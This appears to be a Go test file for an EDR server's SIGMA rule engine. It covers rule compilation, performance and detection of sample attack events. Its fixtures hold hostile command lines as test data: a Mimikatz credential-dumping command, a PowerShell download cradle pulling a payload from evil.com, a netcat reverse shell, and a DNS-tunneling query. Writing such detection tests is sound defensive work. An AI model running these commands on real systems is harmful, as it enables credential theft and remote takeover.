package test

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"edr-server/internal/sigma"

	"github.com/sirupsen/logrus"
)

// TestFullRulesetParsing tests parsing entire rules directory
func TestFullRulesetParsing(t *testing.T) {
	logger := logrus.New()
	logger.SetLevel(logrus.InfoLevel) // Reduce debug noise

	// Load all YAML rules from rules directory
	rules, err := loadAllSigmaRules("../rules/")
	if err != nil {
		t.Fatalf("Failed to load rules: %v", err)
	}

	t.Logf("📊 Loaded %d total SIGMA rules from rules/ directory", len(rules))

	// Create engine and compile all rules
	start := time.Now()
	sigmaEngine := sigma.NewSigmaEngine(nil, logger)

	// Setup comprehensive field mappings like cawalch/sigma-engine
	setupComprehensiveFieldMappings(sigmaEngine)

	err = sigmaEngine.FromRules(rules)
	compilationTime := time.Since(start)

	if err != nil {
		t.Fatalf("Failed to compile %d rules: %v", len(rules), err)
	}

	t.Logf("✅ Successfully compiled %d SIGMA rules in %v", len(rules), compilationTime)
	t.Logf("📈 Compilation rate: %.2f rules/second", float64(len(rules))/compilationTime.Seconds())

	// Verify engine is functional with test event
	testEvent := map[string]interface{}{
		"EventID":     1,
		"Image":       "C:\\Windows\\System32\\cmd.exe",
		"CommandLine": "cmd.exe /c echo test",
		"ProcessId":   1234,
	}

	result, err := sigmaEngine.Evaluate(testEvent)
	if err != nil {
		t.Fatalf("Failed to evaluate test event: %v", err)
	}

	t.Logf("🔍 Test evaluation completed: %d matches found", len(result.MatchedRules))
}

// TestRealisticLogDetection tests with realistic attack scenarios
func TestRealisticLogDetection(t *testing.T) {
	logger := logrus.New()
	logger.SetLevel(logrus.WarnLevel) // Minimal logging for clean output

	// Load subset of rules for focused testing
	rulesPaths := []string{
		"../rules/windows/process_creation/proc_creation_win_hktl_mimikatz_command_line.yml",
		"../rules/windows/process_creation/proc_creation_win_susp_powershell_execution_via_dll.yml",
		"../rules/linux/process_creation/proc_creation_lnx_netcat_reverse_shell.yml",
		"../rules/dns/dns_txt_answer_possible_execution_strings.yml",
	}

	rules := []string{}
	for _, path := range rulesPaths {
		if content, err := ioutil.ReadFile(path); err == nil {
			rules = append(rules, string(content))
		}
	}

	sigmaEngine := sigma.NewSigmaEngine(nil, logger)
	setupComprehensiveFieldMappings(sigmaEngine)
	err := sigmaEngine.FromRules(rules)
	if err != nil {
		t.Fatalf("Failed to compile focused rules: %v", err)
	}

	// Test realistic attack scenarios
	scenarios := []struct {
		name        string
		event       map[string]interface{}
		expected    bool
		description string
	}{
		{
			name: "Mimikatz Credential Dumping",
			event: map[string]interface{}{
				"EventID":     1,
				"Image":       "C:\\Tools\\mimikatz.exe",
				"CommandLine": "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
				"ProcessId":   5678,
				"User":        "SYSTEM",
			},
			expected:    true,
			description: "Mimikatz credential extraction attack",
		},
		{
			name: "PowerShell Fileless Attack",
			event: map[string]interface{}{
				"EventID":     1,
				"Image":       "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
				"CommandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\"",
				"ProcessId":   9999,
				"ParentImage": "C:\\Windows\\System32\\cmd.exe",
			},
			expected:    true,
			description: "PowerShell fileless malware execution",
		},
		{
			name: "Linux Reverse Shell",
			event: map[string]interface{}{
				"EventID":     1,
				"Image":       "/usr/bin/nc",
				"CommandLine": "nc -e /bin/bash 192.168.1.100 4444",
				"ProcessId":   7777,
				"User":        "www-data",
			},
			expected:    true,
			description: "Netcat reverse shell establishment",
		},
		{
			name: "DNS Tunneling C2",
			event: map[string]interface{}{
				"EventID":     22,
				"QueryName":   "dGVzdGluZw.evil-domain.com",
				"QueryType":   "TXT",
				"QueryResult": "cG93ZXJzaGVsbC5leGUgLWMgaWV4",
			},
			expected:    true,
			description: "DNS TXT record used for command execution",
		},
		{
			name: "Legitimate System Process",
			event: map[string]interface{}{
				"EventID":     1,
				"Image":       "C:\\Windows\\System32\\svchost.exe",
				"CommandLine": "svchost.exe -k netsvcs -p",
				"ProcessId":   888,
				"User":        "SYSTEM",
			},
			expected:    false,
			description: "Normal Windows service host process",
		},
		{
			name: "Regular User Activity",
			event: map[string]interface{}{
				"EventID":     1,
				"Image":       "C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
				"CommandLine": "\"C:\\Program Files\\Microsoft Office\\WINWORD.EXE\" /n",
				"ProcessId":   2222,
				"User":        "alice",
			},
			expected:    false,
			description: "Normal Microsoft Word startup",
		},
	}

	t.Logf("🎯 Testing %d realistic attack/benign scenarios", len(scenarios))

	detectedCount := 0
	for _, scenario := range scenarios {
		t.Run(scenario.name, func(t *testing.T) {
			result, err := sigmaEngine.Evaluate(scenario.event)
			if err != nil {
				t.Fatalf("Evaluation failed for %s: %v", scenario.name, err)
			}

			detected := len(result.MatchedRules) > 0
			if detected {
				detectedCount++
			}

			// Detailed logging for each scenario
			if detected && scenario.expected {
				t.Logf("✅ DETECTED: %s - %s (%d rules matched)",
					scenario.name, scenario.description, len(result.MatchedRules))
				for _, match := range result.MatchedRules {
					t.Logf("   🚨 Rule: %s (%s)", match.Title, match.Level)
				}
			} else if !detected && !scenario.expected {
				t.Logf("✅ BENIGN: %s - %s (correctly not detected)",
					scenario.name, scenario.description)
			} else if detected && !scenario.expected {
				t.Errorf("❌ FALSE POSITIVE: %s - %s (should not be detected)",
					scenario.name, scenario.description)
			} else {
				t.Errorf("❌ FALSE NEGATIVE: %s - %s (should be detected)",
					scenario.name, scenario.description)
			}

			if detected != scenario.expected {
				eventJSON, _ := json.MarshalIndent(scenario.event, "", "  ")
				t.Logf("Event details:\n%s", eventJSON)
			}
		})
	}

	t.Logf("📊 Detection Summary: %d/%d scenarios detected", detectedCount, len(scenarios))
}

// TestBatchPerformanceWithLargeRuleset tests performance with full ruleset
func TestBatchPerformanceWithLargeRuleset(t *testing.T) {
	logger := logrus.New()
	logger.SetLevel(logrus.ErrorLevel) // Suppress all logs for clean performance test

	// Load full ruleset
	rules, err := loadAllSigmaRules("../rules/")
	if err != nil {
		t.Fatalf("Failed to load rules: %v", err)
	}

	// Limit to first 100 rules for reasonable test time
	maxRules := 100
	if len(rules) > maxRules {
		rules = rules[:maxRules]
	}

	sigmaEngine := sigma.NewSigmaEngine(nil, logger)
	setupComprehensiveFieldMappings(sigmaEngine)

	// Compilation phase
	compileStart := time.Now()
	err = sigmaEngine.FromRules(rules)
	compileTime := time.Since(compileStart)

	if err != nil {
		t.Fatalf("Failed to compile %d rules: %v", len(rules), err)
	}

	// Generate diverse test events
	testEvents := generateDiverseEvents(1000)

	// Single event evaluation test
	singleStart := time.Now()
	totalMatches := 0
	for _, event := range testEvents {
		result, err := sigmaEngine.Evaluate(event)
		if err != nil {
			t.Fatalf("Evaluation failed: %v", err)
		}
		totalMatches += len(result.MatchedRules)
	}
	singleTime := time.Since(singleStart)

	// Performance metrics
	eventsPerSecond := float64(len(testEvents)) / singleTime.Seconds()
	microsecondsPerEvent := float64(singleTime.Microseconds()) / float64(len(testEvents))

	t.Logf("📊 Large Ruleset Performance Test Results:")
	t.Logf("   Rules compiled: %d", len(rules))
	t.Logf("   Compilation time: %v (%.2f rules/sec)", compileTime, float64(len(rules))/compileTime.Seconds())
	t.Logf("   Events processed: %d", len(testEvents))
	t.Logf("   Total execution time: %v", singleTime)
	t.Logf("   Events per second: %.2f", eventsPerSecond)
	t.Logf("   Microseconds per event: %.2f μs", microsecondsPerEvent)
	t.Logf("   Total matches found: %d", totalMatches)
	t.Logf("   Match rate: %.2f%%", float64(totalMatches)/float64(len(testEvents))*100)

	// Performance assertions based on cawalch/sigma-engine benchmarks
	if eventsPerSecond < 1000 {
		t.Logf("⚠️  Performance below 1000 events/sec (got %.2f)", eventsPerSecond)
	}
	if microsecondsPerEvent > 1000 {
		t.Logf("⚠️  High latency: %.2f μs per event", microsecondsPerEvent)
	}
}

// Helper function to setup comprehensive field mappings like cawalch/sigma-engine
func setupComprehensiveFieldMappings(engine *sigma.SigmaEngine) {
	mappings := map[string]string{
		// Windows Process Creation
		"ProcessImage":             "Image",
		"ProcessCommandLine":       "CommandLine",
		"ParentProcessImage":       "ParentImage",
		"ParentProcessCommandLine": "ParentCommandLine",
		"ParentProcessId":          "ParentProcessId",
		"ProcessGuid":              "ProcessGuid",
		"ProcessId":                "ProcessId",
		"User":                     "User",
		"LogonGuid":                "LogonGuid",
		"LogonId":                  "LogonId",
		"TerminalSessionId":        "TerminalSessionId",
		"IntegrityLevel":           "IntegrityLevel",
		"Hashes":                   "Hashes",
		"Company":                  "Company",
		"Description":              "Description",
		"Product":                  "Product",
		"FileVersion":              "FileVersion",
		"OriginalFileName":         "OriginalFileName",
		"CurrentDirectory":         "CurrentDirectory",

		// File and Registry
		"TargetFilename": "file_path",
		"TargetFileName": "file_path",
		"FileName":       "file_path",
		"TargetObject":   "registry_key",
		"Details":        "registry_value",

		// Network
		"DestinationIp":       "dst_ip",
		"SourceIp":            "src_ip",
		"DestinationPort":     "dst_port",
		"SourcePort":          "src_port",
		"DestinationHostname": "dst_host",
		"SourceHostname":      "src_host",
		"Protocol":            "protocol",

		// DNS
		"QueryName":    "dns_query",
		"QueryResults": "dns_answer",
		"QueryResult":  "dns_answer",
		"QueryType":    "dns_type",

		// Authentication
		"TargetUserName":  "user",
		"SubjectUserName": "user",
		"LogonType":       "logon_type",
		"WorkstationName": "workstation",
		"IpAddress":       "src_ip",

		// Service and Scheduled Tasks
		"ServiceName":     "service_name",
		"ServiceFileName": "service_path",
		"TaskName":        "task_name",
		"TaskContent":     "task_content",
	}

	for from, to := range mappings {
		engine.AddFieldMapping(from, to)
	}
}

// Helper function to load all SIGMA rules from directory
func loadAllSigmaRules(rulesDir string) ([]string, error) {
	var rules []string

	err := filepath.Walk(rulesDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		if strings.HasSuffix(strings.ToLower(path), ".yml") || strings.HasSuffix(strings.ToLower(path), ".yaml") {
			content, err := ioutil.ReadFile(path)
			if err != nil {
				return fmt.Errorf("failed to read %s: %w", path, err)
			}

			// Basic validation - should contain 'detection:' field
			if strings.Contains(string(content), "detection:") {
				rules = append(rules, string(content))
			}
		}

		return nil
	})

	return rules, err
}

// Helper function to generate diverse test events
func generateDiverseEvents(count int) []map[string]interface{} {
	events := make([]map[string]interface{}, 0, count)

	// Event templates for different categories
	templates := []map[string]interface{}{
		// Windows Process Creation
		{
			"EventID":     1,
			"Image":       "C:\\Windows\\System32\\cmd.exe",
			"CommandLine": "cmd.exe /c dir",
			"ProcessId":   1234,
			"User":        "alice",
		},
		// PowerShell execution
		{
			"EventID":     1,
			"Image":       "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
			"CommandLine": "powershell.exe -Command Get-Process",
			"ProcessId":   5678,
			"User":        "bob",
		},
		// Network connection
		{
			"EventID":  3,
			"Image":    "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
			"dst_ip":   "192.168.1.100",
			"dst_port": 443,
			"src_port": 49152,
			"protocol": "tcp",
		},
		// File creation
		{
			"EventID":   11,
			"Image":     "C:\\Windows\\System32\\notepad.exe",
			"file_path": "C:\\Users\\alice\\Documents\\test.txt",
			"ProcessId": 9999,
		},
		// DNS query
		{
			"EventID":    22,
			"Image":      "C:\\Windows\\System32\\svchost.exe",
			"dns_query":  "www.example.com",
			"dns_type":   "A",
			"dns_answer": "93.184.216.34",
		},
	}

	for i := 0; i < count; i++ {
		template := templates[i%len(templates)]
		event := make(map[string]interface{})

		// Copy template
		for k, v := range template {
			event[k] = v
		}

		// Add some variation
		if pid, ok := event["ProcessId"]; ok {
			event["ProcessId"] = pid.(int) + i
		}

		events = append(events, event)
	}

	return events
}
